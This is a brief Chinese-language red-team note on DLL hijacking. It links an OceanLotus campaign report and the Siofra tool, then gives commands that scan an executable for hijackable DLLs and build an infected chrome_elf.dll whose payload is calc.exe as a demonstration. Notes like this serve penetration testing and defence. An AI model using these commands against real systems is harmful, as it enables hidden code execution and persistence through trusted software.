### 简介

DLL Hijacking

[【微步在线报告】“海莲花”攻击 - 白利用 0检出](https://m.threatbook.cn/detail/1397?from=groupmessage&isappinstalled=0)

### 测试

[Cybereason/siofra](https://github.com/Cybereason/siofra)

```
# 文件扫描模式 对父程序xx.exe进行扫描 枚举它所依赖的dll文件 并检测能否DLL Hijacking
Siofra32.exe --mode file-scan -f "c:\Program Files\xxx\xx.exe" --enum-dependency --dll-hijack
# 如结果
# [!] Module chrome_elf.dll vulnerable at C:\ProgramData\xxx\chrome_elf.dll (real path: Unknown)

# Exploit - 生成存在恶意代码chrome_elf.dll 从而实现dll劫持
Siofra32.exe --mode infect -f chrome_elf(real).dll -o chrome_elf.dll --payload-type process --payload-path C:\Windows\System32\calc.exe
```
